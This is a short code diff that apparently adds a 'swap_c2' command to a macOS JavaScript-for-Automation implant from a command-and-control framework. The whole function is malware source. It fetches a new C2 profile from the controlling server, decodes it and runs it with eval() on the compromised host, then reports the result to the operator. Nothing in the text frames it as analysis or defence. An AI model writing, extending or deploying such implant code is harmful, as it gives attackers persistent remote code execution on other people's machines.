@@ -1,0 +1,11 @@
+exports.swap_c2 = function(task, command, params){
+    var config = JSON.parse(params);
+    var profile = C2.upload(task, config['profile']);
+    try{
+        var file_data = $.NSString.alloc.initWithDataEncoding(profile, $.NSUTF8StringEncoding).js;
+        eval(file_data);
+    }catch(error){
+        return "Failed to load new profile";
+    }
+    return "Successfully swapped profiles";
+};
